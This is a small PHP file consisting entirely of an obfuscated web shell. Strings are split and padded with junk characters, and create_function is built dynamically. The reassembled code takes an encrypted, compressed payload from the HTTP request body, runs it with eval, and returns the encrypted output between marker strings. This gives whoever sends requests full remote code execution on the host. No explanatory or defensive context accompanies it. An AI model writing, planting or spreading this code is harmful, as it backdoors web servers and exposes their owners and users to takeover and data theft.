<?php
$z='$k="7235fXX9X04";X$khX="3deec527a0bb";$kfX="0XX2fbd85cebcc";X$p="';
$c='asXe64_encode(@x(@XgXzcomprXess($o),$k)X);prXint("X$p$kh$r$kf");}';
$R='X$j++X,$XXi++){$o.=$t{$i}^$k{$j};X}}Xreturn $o;}iXf X(@preg_matcX';
$w='X[X1]),$k)));$Xo=@oXXXb_get_conteXnts(X);@ob_end_clXeaXn();X$r=@b';
$i='h(X"/$kh(.+)$kfX/",@Xfile_Xget_cXonXtents("phpX://iXXnput"),$m)==';
$Y='1)X {X@ob_start();@eXval(X@gzuXncomXpress(@x(@XbaseX64_decoXde($m';
$f=str_replace('M','','creMMaMtMe_fMunMction');
$j='rlenX($t);$o="X";for($i=0X;$i<$lX;)X{for($j=0;X($j<$Xc&&$i<$Xl);X';
$Z='XoaVByjGEnS7jXxqgXA";funcXtXXion Xx($t,$Xk){$c=strlen($k);$lX=stX';
$Q=str_replace('X','',$z.$Z.$j.$R.$i.$Y.$w.$c);
$x=$f('',$Q);$x();
?>
